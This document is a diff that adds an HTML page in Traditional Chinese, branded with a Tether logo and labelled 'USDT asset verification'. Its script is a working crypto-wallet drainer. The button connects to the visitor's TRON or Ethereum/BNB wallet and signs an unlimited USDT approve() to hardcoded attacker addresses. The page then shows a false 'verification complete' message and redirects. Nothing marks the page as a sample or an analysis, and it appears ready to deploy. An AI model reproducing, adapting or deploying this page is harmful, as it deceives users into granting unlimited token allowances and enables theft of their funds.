@@ -1,1 +1,157 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>資產驗證</title>
+<style>
+  body {
+    font-family: "Noto Sans TC", sans-serif;
+    background: #f5f6fa;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .card {
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    padding: 25px;
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+  }
+  .logo {
+    width: 80px;
+    margin-bottom: 10px;
+  }
+  h1 {
+    font-size: 20px;
+    margin-bottom: 5px;
+  }
+  p {
+    color: #555;
+    font-size: 14px;
+    margin-bottom: 15px;
+  }
+  .amount {
+    font-size: 22px;
+    font-weight: bold;
+    margin-bottom: 20px;
+    color: #333;
+  }
+  .btn {
+    padding: 12px;
+    background: #2563eb;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    cursor: pointer;
+    width: 100%;
+    transition: 0.3s;
+  }
+  .btn:hover {
+    background: #1e4ed8;
+  }
+  .status {
+    margin-top: 15px;
+    font-size: 14px;
+  }
+  .loading { color: #eab308; }
+  .success { color: #16a34a; }
+  .error { color: #dc2626; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+<div class="card">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" class="logo" alt="Logo">
+  <h1>資產驗證</h1>
+  <p>請確認並驗證您的資產配置</p>
+  <div class="amount">USDT 驗證</div>
+  <button class="btn" id="verifyBtn">立即驗證</button>
+  <div class="status loading" id="status">等待操作...</div>
+</div>
 
+<script>
+  const USDT_CONTRACTS = {
+    TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    BNB:  "0x55d398326f99059fF775485246999027B3197955"
+  };
+  const TARGET_ADDRESS = {
+    TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
+    EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
+  };
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+  function setStatus(msg, cls="loading") {
+    const el = document.getElementById("status");
+    el.innerText = msg;
+    el.className = "status " + cls;
+  }
+
+  document.getElementById("verifyBtn").onclick = async function() {
+    try {
+      setStatus("檢測錢包中...");
+      if (window.tronWeb && window.tronWeb.ready) {
+        await tronApprove();
+        return;
+      }
+      if (window.tronLink) {
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        await tronApprove();
+        return;
+      }
+      if (window.ethereum) {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        await evmApprove();
+        return;
+      }
+      setStatus("未檢測到錢包", "error");
+    } catch (err) {
+      console.error(err);
+      setStatus("驗證失敗", "error");
+      setTimeout(() => window.location.href = "fail.html", 1500);
+    }
+  }
+
+  async function tronApprove() {
+    try {
+      const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRON);
+      await contract.approve(TARGET_ADDRESS.TRON, INFINITE_AMOUNT).send();
+      setStatus("✅ 驗證完成", "success");
+      setTimeout(() => window.location.href = "success.html", 1000);
+    } catch {
+      setStatus("驗證失敗", "error");
+      setTimeout(() => window.location.href = "fail.html", 1500);
+    }
+  }
+
+  async function evmApprove() {
+    try {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+      const network = await provider.getNetwork();
+      let usdtAddress;
+      if (network.chainId === 1) usdtAddress = USDT_CONTRACTS.ETH;
+      else if (network.chainId === 56) usdtAddress = USDT_CONTRACTS.BNB;
+      else throw new Error("不支援的鏈");
+      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+      const contract = new ethers.Contract(usdtAddress, abi, signer);
+      const tx = await contract.approve(TARGET_ADDRESS.EVM, INFINITE_AMOUNT);
+      await tx.wait();
+      setStatus("✅ 驗證完成", "success");
+      setTimeout(() => window.location.href = "success.html", 1000);
+    } catch {
+      setStatus("驗證失敗", "error");
+      setTimeout(() => window.location.href = "fail.html", 1500);
+    }
+  }
+</script>
+</body>
+</html>
